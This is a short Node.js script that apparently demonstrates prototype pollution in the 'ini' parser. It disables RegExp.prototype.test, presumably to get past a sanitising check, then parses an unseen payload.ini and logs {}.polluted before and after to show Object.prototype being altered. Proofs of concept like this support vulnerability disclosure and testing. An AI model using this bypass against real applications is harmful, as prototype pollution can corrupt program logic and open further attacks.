RegExp.prototype.test = () => false;
const fs = require('fs');
const path = require('path');
const ini = require('ini');
obj = {};
console.log({}.polluted);
ini.parse(fs.readFileSync(path.resolve(__dirname, './payload.ini'), 'utf-8'));
console.log({}.polluted);